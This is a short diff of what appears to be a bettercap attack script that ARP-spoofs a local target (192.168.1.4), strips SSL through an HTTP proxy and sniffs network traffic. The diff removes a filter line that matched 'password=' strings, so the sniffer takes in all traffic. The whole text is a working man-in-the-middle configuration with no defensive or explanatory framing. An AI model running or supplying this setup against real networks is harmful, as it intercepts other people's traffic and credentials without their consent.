@@ -2,7 +2,7 @@ set http.proxy.sslstrip true
 set arp.spoof.internal true
 set arp.spoof.targets 192.168.1.4
 set net.sniff.verbose false
-set net.sniff.regexp .*password=.+
+
 net.sniff on
 http.proxy on
 arp.spoof on
